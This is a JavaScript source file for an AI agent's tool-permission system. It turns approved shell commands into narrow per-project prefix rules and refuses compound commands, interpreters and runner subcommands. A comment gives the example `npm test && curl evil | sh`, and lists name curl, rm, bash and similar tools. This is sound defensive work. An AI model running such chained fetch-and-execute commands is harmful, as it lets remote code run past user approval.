//
// Claude-style permission rules (migration 0034), replacing the global
// per-tool grant in kb/tool-approvals.mjs.
//
// Checked AFTER the safety gate, and only for the 'prompt' tier — same
// contract as before: 'blocked' denies outright and 'auto' runs outright,
// neither consulting this table.
//
// A rule is scoped to ONE project and, for shell commands, to a command
// PREFIX ("npm test", "git status"): approving `npm test` once no longer lets
// `rm -rf build` run unasked, and approving it in repo A says nothing about
// repo B.
import os from 'node:os';
import path from 'node:path';
import { getDb, requireUser, lazyPrepare } from './db.mjs';

/**
 * The key a project's rules are stored under: the absolute, tilde-expanded
 * workspace root. Both engines pass whatever spelling they hold (`~/repo`,
 * a trailing slash) and still address the same rules.
 */
export function projectKey(root) {
  if (typeof root !== 'string' || !root.trim()) return '';
  let r = root.trim();
  if (r === '~' || r.startsWith('~/')) r = path.join(os.homedir(), r.slice(1));
  return path.resolve(r);
}

// Which commands may be generalised at all. Safe by default: a rule is only
// ever offered for a shape known not to widen into "run anything".
//
// 1. Tools whose first argument is a subcommand: the rule is ALWAYS
//    "<tool> <subcommand>" (`git status` and `git push` are different
//    permissions). No subcommand, or a flag where it should be
//    (`git -C x …`, `npm -v`), and nothing is offered — the tool alone would
//    cover every subcommand, `git push --force` and `npm publish` included.
const SUBCOMMAND_TOOLS = new Set([
  'git', 'npm', 'pnpm', 'yarn', 'bun', 'swift', 'cargo', 'go', 'make', 'docker',
  'kubectl', 'gh', 'glab', 'brew', 'pip', 'pip3', 'xcodebuild', 'dotnet', 'mvn',
  'gradle', 'bundle', 'rake', 'poetry', 'uv',
]);
// `npm run <script>` — the script is the permission, not "run".
const RUN_SCRIPT_TOOLS = new Set(['npm', 'pnpm', 'yarn', 'bun']);
// Subcommands that run arbitrary packages, containers, API calls or config
// (which can install hooks): once-only, never a rule.
const RUNNER_SUBCOMMANDS = new Set([
  'npm exec', 'npm x', 'pnpm exec', 'pnpm dlx', 'yarn exec', 'yarn dlx', 'bun x',
  'docker run', 'docker exec', 'kubectl exec', 'gh api', 'glab api', 'git config',
  'go run', 'uv run', 'poetry run', 'bundle exec',
]);
// 2. Single commands whose name alone may be the rule: read-only inspection
//    and test/lint tools. Anything else — wrappers (`timeout`, `env`,
//    `xargs`, `sudo`), shells and interpreters (`bash`, `node`, `python`),
//    `find`, `rm`, `curl`, runners like `npx` — would let one approval cover
//    arbitrary code, so it is "Allow once" only.
const SINGLE_WORD_RULES = new Set([
  'ls', 'cat', 'head', 'tail', 'wc', 'grep', 'rg', 'pwd', 'which', 'tree', 'du', 'df',
  'diff', 'echo', 'jq', 'stat', 'file', 'tsc', 'eslint', 'jest', 'vitest', 'pytest',
  'mocha', 'swiftlint', 'shellcheck', 'true', 'false',
]);

// Shell syntax that chains, substitutes or redirects: a prefix rule must
// never match a command that does more than the prefix says
// (`npm test && curl evil | sh`).
const COMPOUND_RE = /[;&|`<>\n\r]|\$\(|\$\{/;

/**
 * The rule a shell command would be approved under ("npm test", "git
 * status"), or null when the command cannot safely be generalised — compound
 * commands, leading env assignments, empty input. null means the approval card
 * offers "Allow once" only.
 */
export function commandPrefix(command) {
  const cmd = typeof command === 'string' ? command.trim() : '';
  if (!cmd || COMPOUND_RE.test(cmd)) return null;
  const tokens = cmd.split(/\s+/);
  if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[0])) return null;
  const head = tokens[0];
  const sub = tokens[1];
  if (SUBCOMMAND_TOOLS.has(head)) {
    if (!sub || sub.startsWith('-')) return null;
    if (RUN_SCRIPT_TOOLS.has(head) && sub === 'run') {
      const script = tokens[2];
      return script && !script.startsWith('-') ? `${head} run ${script}` : null;
    }
    const prefix = `${head} ${sub}`;
    return RUNNER_SUBCOMMANDS.has(prefix) ? null : prefix;
  }
  return SINGLE_WORD_RULES.has(head) ? head : null;
}

/** Whether `command` is covered by a prefix rule `pattern`. */
export function commandMatches(pattern, command) {
  const cmd = typeof command === 'string' ? command.trim() : '';
  if (!pattern || !cmd || COMPOUND_RE.test(cmd)) return false;
  return cmd === pattern || cmd.startsWith(`${pattern} `);
}

const isShellTool = (toolName) => toolName === 'Bash' || toolName === 'run-bash';

// The sandbox's network ask: with the sandbox on, a command reaching a host
// that is not allow-listed makes the CLI call canUseTool with this pseudo-tool
// and `{ host, port }`. Its rules are per HOST — a tool-wide network rule
// would open every host, so none is ever offered or honoured.
export const NETWORK_TOOL = 'SandboxNetworkAccess';
const HOST_RE = /^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)*$/;

/** The request's host, lowercased, or null when it is not a plain hostname. */
export function networkHost(input) {
  const host = typeof input?.host === 'string' ? input.host.trim().toLowerCase() : '';
  return host.length <= 253 && HOST_RE.test(host) ? host : null;
}

/**
 * Does a stored rule cover this call? `input` is the tool input — for a shell
 * tool its `command` is matched against prefix rules; any other tool matches a
 * tool-wide rule (pattern '').
 */
export function isAllowedByRule(userId, projectRoot, toolName, input) {
  requireUser(userId);
  const key = projectKey(projectRoot);
  if (!key || !toolName) return false;
  const rows = lazyPrepare(
    getDb(),
    'SELECT pattern FROM tool_permission_rules WHERE user_id = ? AND project_root = ? AND tool_name = ?',
  ).all(userId, key, toolName);
  if (!rows.length) return false;
  if (isShellTool(toolName)) {
    return rows.some((r) => r.pattern && commandMatches(r.pattern, input?.command));
  }
  if (toolName === NETWORK_TOOL) {
    const host = networkHost(input);
    return Boolean(host) && rows.some((r) => r.pattern === host);
  }
  return rows.some((r) => r.pattern === '');
}

/**
 * The rule an "always allow" answer would save for this call, or null when
 * none can be offered. The approval card shows `label`.
 */
export function suggestRule(toolName, input) {
  if (isShellTool(toolName)) {
    const prefix = commandPrefix(input?.command);
    return prefix ? { toolName, pattern: prefix, label: `\`${prefix}\` commands` } : null;
  }
  if (toolName === NETWORK_TOOL) {
    const host = networkHost(input);
    return host ? { toolName, pattern: host, label: `network access to ${host}` } : null;
  }
  return { toolName, pattern: '', label: toolName };
}

export function addRule(userId, projectRoot, toolName, pattern = '') {
  requireUser(userId);
  const key = projectKey(projectRoot);
  if (!key || !toolName) return false;
  lazyPrepare(
    getDb(),
    'INSERT OR IGNORE INTO tool_permission_rules (user_id, project_root, tool_name, pattern) VALUES (?, ?, ?, ?)',
  ).run(userId, key, toolName, pattern || '');
  return true;
}

export function listRules(userId) {
  requireUser(userId);
  return lazyPrepare(
    getDb(),
    'SELECT project_root, tool_name, pattern, created_at FROM tool_permission_rules WHERE user_id = ? ORDER BY project_root ASC, created_at DESC',
  ).all(userId).map((r) => ({
    projectRoot: r.project_root, toolName: r.tool_name, pattern: r.pattern, grantedAt: r.created_at,
  }));
}

export function removeRule(userId, { projectRoot, toolName, pattern = '' } = {}) {
  requireUser(userId);
  return lazyPrepare(
    getDb(),
    'DELETE FROM tool_permission_rules WHERE user_id = ? AND project_root = ? AND tool_name = ? AND pattern = ?',
  ).run(userId, projectKey(projectRoot), toolName, pattern || '').changes > 0;
}

export function removeAllRules(userId) {
  requireUser(userId);
  return lazyPrepare(getDb(), 'DELETE FROM tool_permission_rules WHERE user_id = ?').run(userId).changes;
}

// "Allow all edits in this chat" — Claude Code's session-scoped accept-edits.
// In memory on purpose: it lasts for the chat (until the server restarts),
// the way Claude Code's lasts for the session, and is never persisted.
const sessionEditGrants = new Set();
const editKey = (userId, chatSessionId) => `${userId}\u0000${chatSessionId}`;
export function grantSessionEdits(userId, chatSessionId) {
  if (userId && chatSessionId) sessionEditGrants.add(editKey(userId, chatSessionId));
}
export function hasSessionEdits(userId, chatSessionId) {
  return !!(userId && chatSessionId) && sessionEditGrants.has(editKey(userId, chatSessionId));
}
export function _resetSessionEditsForTest() { sessionEditGrants.clear(); }
